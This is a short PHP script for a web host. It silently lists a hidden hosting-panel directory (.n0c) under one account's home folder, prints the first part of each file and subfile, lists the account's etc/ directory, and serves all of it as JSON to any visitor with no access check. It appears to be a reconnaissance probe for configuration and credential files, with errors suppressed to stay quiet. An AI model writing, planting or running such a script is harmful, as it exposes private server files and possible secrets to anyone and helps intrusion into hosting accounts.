<?php
error_reporting(0);
ob_start();
header('Content-Type: application/json');

$out = [];
$n0c = '/home/atqadcksav/.n0c';

$out['exists']   = (bool)@file_exists($n0c);
$out['is_dir']   = (bool)@is_dir($n0c);
$out['readable'] = (bool)@is_readable($n0c);

$scan = @scandir($n0c);
$out['scandir'] = is_array($scan) ? $scan : 'failed';

if (is_array($scan)) {
    foreach ($scan as $f) {
        if ($f === '.' || $f === '..') continue;
        $fp = "$n0c/$f";
        $t  = @is_dir($fp) ? 'dir' : 'file';
        $c  = ($t === 'file') ? @file_get_contents($fp) : null;
        $out['files'][$f] = ['type' => $t, 'content' => $c ? substr($c, 0, 500) : null];
        if ($t === 'dir') {
            $sub = @scandir($fp) ?: [];
            foreach ($sub as $sf) {
                if ($sf === '.' || $sf === '..') continue;
                $c2 = @file_get_contents("$fp/$sf");
                $out['files'][$f]['sub'][$sf] = $c2 ? substr($c2, 0, 300) : null;
            }
        }
    }
}

// Aussi: home etc/
$out['etc'] = @scandir('/home/atqadcksav/etc') ?: 'nope';

ob_end_clean();
echo json_encode($out, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
